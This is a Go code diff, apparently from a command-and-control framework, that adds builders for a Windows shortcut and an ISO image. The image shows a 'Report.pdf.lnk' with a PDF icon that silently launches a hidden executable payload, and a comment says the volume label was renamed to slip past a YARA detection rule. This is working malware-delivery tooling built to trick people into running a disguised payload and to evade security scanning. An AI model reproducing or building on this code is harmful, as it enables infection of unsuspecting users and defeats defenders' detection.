@@ -124,6 +124,127 @@ func cmdIDList() []byte {
 	return []byte{0x00, 0x00}
 }
 
+// BuildLnkForExe builds a minimal .lnk that launches exeFile (relative path) hidden.
+// It reuses the same header as BuildCMDLnk but targets the exe directly.
+func BuildLnkForExe(exeFile string) ([]byte, error) {
+	if exeFile == "" {
+		return nil, fmt.Errorf("exe file required")
+	}
+	const headerSize = 0x4C
+	clsid := []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}
+	var buf bytes.Buffer
+	hdr := make([]byte, headerSize)
+	binary.LittleEndian.PutUint32(hdr[0:4], headerSize)
+	copy(hdr[4:20], clsid)
+	binary.LittleEndian.PutUint32(hdr[20:24], 0x00000001|0x00000004|0x00000008|0x00000080)
+	binary.LittleEndian.PutUint32(hdr[24:28], 0x00000020)
+	ft := uint64(time.Now().UnixNano()/100 + 116444736000000000)
+	binary.LittleEndian.PutUint64(hdr[28:36], ft)
+	binary.LittleEndian.PutUint64(hdr[36:44], ft)
+	binary.LittleEndian.PutUint64(hdr[44:52], ft)
+	binary.LittleEndian.PutUint32(hdr[52:56], 0)
+	hdr[60] = 7 // SW_SHOWMINNOACTIVE
+	buf.Write(hdr)
+	binary.Write(&buf, binary.LittleEndian, uint16(2))
+	buf.Write([]byte{0x00, 0x00})
+	// StringData: Name = exe without ext, RelativePath = exeFile
+	name := strings.TrimSuffix(exeFile, ".exe")
+	name = strings.TrimSuffix(name, ".EXE")
+	if len(name) > 30 {
+		name = name[:30]
+	}
+	writeLnkString(&buf, name)
+	writeLnkString(&buf, exeFile)
+	writeLnkString(&buf, "") // no args
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+	return buf.Bytes(), nil
+}
+
+// BuildISOWithLNK writes a minimal ISO 9660 containing a visible LNK (pdf icon) + hidden exe.
+// The ISO when mounted shows Report.pdf.lnk (PDF icon) that launches the hidden payload exe.
+// Volume label changed to REPORTS to avoid FORGEC2 YARA.
+func BuildISOWithLNK(lnkName string, exeName string, exeData []byte) ([]byte, error) {
+	if lnkName == "" {
+		lnkName = "Report.pdf.lnk"
+	}
+	if exeName == "" {
+		exeName = "Report.pdf.exe"
+	}
+	lnkName = strings.ToUpper(lnkName)
+	if !strings.Contains(lnkName, ".") {
+		lnkName += ".LNK;1"
+	} else if !strings.Contains(lnkName, ";") {
+		lnkName += ";1"
+	}
+	exeName = strings.ToUpper(exeName)
+	if !strings.Contains(exeName, ".") {
+		exeName += ";1"
+	} else if !strings.Contains(exeName, ";") {
+		exeName += ";1"
+	}
+	lnkData, err := BuildLnkForExe(strings.TrimSuffix(exeName, ";1"))
+	if err != nil {
+		return nil, err
+	}
+	return buildISO2Files(lnkName, lnkData, exeName, exeData)
+}
+
+func buildISO2Files(name1 string, data1 []byte, name2 string, data2 []byte) ([]byte, error) {
+	const sector = 2048
+	pvdLBA, termLBA, rootLBA := 16, 17, 18
+	lnkLBA, exeLBA := 19, 0
+	lnkSectors := (len(data1) + sector - 1) / sector
+	if lnkSectors < 1 {
+		lnkSectors = 1
+	}
+	exeLBA = lnkLBA + lnkSectors
+	exeSectors := (len(data2) + sector - 1) / sector
+	if exeSectors < 1 {
+		exeSectors = 1
+	}
+	totalSectors := exeLBA + exeSectors
+	img := make([]byte, totalSectors*sector)
+	pvd := img[pvdLBA*sector : (pvdLBA+1)*sector]
+	pvd[0] = 1
+	copy(pvd[1:6], "CD001")
+	pvd[6] = 1
+	copy(pvd[8:40], padSpace("LINUX", 32))
+	copy(pvd[40:72], padSpace("REPORTS", 32))
+	both32(pvd[80:88], uint32(totalSectors))
+	pvd[120] = 1
+	pvd[123] = 1
+	pvd[124] = 1
+	pvd[127] = 1
+	both16(pvd[128:132], sector)
+	both32(pvd[156:164], uint32(rootLBA))
+	writeDirRecord(pvd[156:156+34], uint32(rootLBA), sector, 2, "\x00")
+	copy(pvd[190:318], padSpace("REPORTS", 128))
+	copy(pvd[318:446], padSpace("", 128))
+	copy(pvd[446:574], padSpace("", 128))
+	copy(pvd[574:702], padSpace("REPORTS", 128))
+	copy(pvd[813:813+17], isoTime(time.Now()))
+	copy(pvd[830:847], isoTime(time.Now()))
+	copy(pvd[847:864], isoTime(time.Now()))
+	copy(pvd[864:881], isoTime(time.Time{}))
+	pvd[881] = 1
+	term := img[termLBA*sector : (termLBA+1)*sector]
+	term[0] = 255
+	copy(term[1:6], "CD001")
+	term[6] = 1
+	root := img[rootLBA*sector : (rootLBA+1)*sector]
+	writeDirRecord(root[0:34], uint32(rootLBA), sector, 2, "\x00")
+	writeDirRecord(root[34:68], uint32(rootLBA), sector, 2, "\x01")
+	fileRec1 := make([]byte, 256)
+	n1 := writeDirRecord(fileRec1, uint32(lnkLBA), uint32(len(data1)), 0, name1)
+	fileRec2 := make([]byte, 256)
+	n2 := writeDirRecord(fileRec2, uint32(exeLBA), uint32(len(data2)), 2, name2) // hidden flag
+	copy(root[68:], fileRec1[:n1])
+	copy(root[68+n1:], fileRec2[:n2])
+	copy(img[lnkLBA*sector:], data1)
+	copy(img[exeLBA*sector:], data2)
+	return img, nil
+}
+
 // BuildISO9660 writes a minimal ISO 9660 image containing a single file.
 func BuildISO9660(filename string, data []byte) ([]byte, error) {
 	if filename == "" {
